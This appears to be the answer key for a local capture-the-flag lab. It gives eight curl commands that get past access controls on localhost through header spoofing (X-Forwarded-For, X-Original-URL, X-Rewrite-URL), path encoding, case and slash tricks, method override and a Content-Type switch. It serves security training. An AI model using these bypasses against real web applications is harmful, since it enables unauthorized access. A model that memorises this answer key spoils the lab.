---
date: 2026-06-04
---

## Challenge 1 — Internal Network Spoof
```bash
curl -H "X-Forwarded-For: 127.0.0.1" http://localhost:3000/challenge/1/admin
```

## Challenge 2 — WAF URL Rewrite
```bash
curl -H "X-Rewrite-URL: /challenge/2/secret" http://localhost:3000/challenge/2/public
```

## Challenge 3 — Path Normalization
```bash
curl "http://localhost:3000/challenge/3/%70rivate"
# %70 = 'p' in hex → decodes to /challenge/3/private
```

## Challenge 4 — Method Override
```bash
curl -X POST -H "X-HTTP-Method-Override: PATCH" http://localhost:3000/challenge/4/resource
# Also works with: X-Method-Override, or ?_method=PATCH
```

## Challenge 5 — X-Original-URL Smuggling
```bash
curl -H "X-Original-URL: /challenge/5/internal" http://localhost:3000/challenge/5/gateway
```

## Challenge 6 — Case Sensitivity
```bash
curl "http://localhost:3000/challenge/6/Admin"
# Also works: /ADMIN, /aDmIn
```

## Challenge 7 — Slash Confusion
```bash
curl "http://localhost:3000/challenge/7//hidden"
# Also works: /challenge//7/hidden, /challenge/7/./hidden
```

## Challenge 8 — Content-Type Smuggling
```bash
curl -X POST -H "Content-Type: application/xml" -d "<x>test</x>" http://localhost:3000/challenge/8/action
# Any non-json, non-form CT works: text/plain, application/octet-stream, etc.
```

---

Submit each `FLAG{...}` in the UI to unlock the writeups per challenge.
